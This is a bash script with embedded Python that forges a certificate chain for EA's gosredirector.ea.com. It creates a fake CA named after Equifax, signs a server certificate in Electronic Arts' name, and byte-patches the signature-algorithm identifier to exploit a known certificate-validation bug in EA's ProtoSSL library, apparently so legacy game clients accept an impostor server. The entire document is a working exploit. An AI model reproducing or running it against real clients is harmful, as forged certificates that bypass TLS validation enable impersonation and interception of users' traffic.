#!/bin/bash

set -e

export MSYS_NO_PATHCONV=1
export MSYS2_ARG_CONV_EXCL="*"

echo " EA ProtoSSL Certificate"
echo " Old ProtoSSL Bug Compatible"
echo " gosredirector.ea.com"

DAYS=10000

rm -rf certs
mkdir certs
cd certs

echo "[+] Generating Equifax CA key"

openssl genrsa \
-out equifax.key \
1024

echo "[+] Creating CA"

openssl req \
-new \
-x509 \
-md5 \
-days $DAYS \
-key equifax.key \
-out equifax.crt \
-subj "/C=US/O=Equifax/OU=Equifax Secure Certificate Authority/CN=Equifax Secure Certificate Authority"

echo "[+] Generating server key"

openssl genrsa \
-out gosredirector.key \
1024

echo "[+] Creating CSR"

openssl req \
-new \
-md5 \
-key gosredirector.key \
-out gosredirector.csr \
-subj "/C=US/ST=California/L=Redwood City/O=Electronic Arts, Inc./OU=Global Online Studio/CN=gosredirector.ea.com"

echo "[+] Signing certificate"

openssl x509 \
-req \
-md5 \
-days $DAYS \
-in gosredirector.csr \
-CA equifax.crt \
-CAkey equifax.key \
-CAcreateserial \
-out gosredirector.crt

echo "[+] Export DER"


openssl x509 \
-in gosredirector.crt \
-outform DER \
-out gosredirector.der

echo "[+] Patching ProtoSSL bug"

Py3 <<'PY'

data=open("gosredirector.der", "rb").read()

old=bytes.fromhex("2a864886f70d010104")
new=bytes.fromhex("2a864886f70d010101")

positions=[]
offset=0

while True:
    pos=data.find(old,offset)

    if pos == -1:
        break

    positions.append(pos)
    offset=pos+1

print("Found:",positions)


if len(positions)!=2: raise Exception("Expected exactly two MD5 identifiers")
patch=positions[1]

data=data[:patch]+new+data[patch+9:]

open("gosredirector_mod.der", "wb").write(data)

print("Patched:",hex(patch))

PY


echo "[+] Creating patched PEM"

Py3 <<'PY'

import base64
import textwrap

data=open("gosredirector_mod.der", "rb").read()


b64=base64.b64encode(data).decode()

with open("gosredirector_mod.pem", "w") as f:

    f.write("-----BEGIN CERTIFICATE-----\n")

    for line in textwrap.wrap(b64,64):
        f.write(line+"\n")

    f.write("-----END CERTIFICATE-----\n")

PY

echo "[+] Creating TLS chain"

cat \
gosredirector_mod.pem \
equifax.crt \
> server.pem


echo "[+] Creating PFX"
echo
echo "CHECK PATCH"

xxd -p gosredirector_mod.der \
| tr -d '\n' \
| grep -o "2a864886f70d0101[0-9a-f][0-9a-f]"

echo
echo "FILES"

ls -lh

echo
echo "DONE"
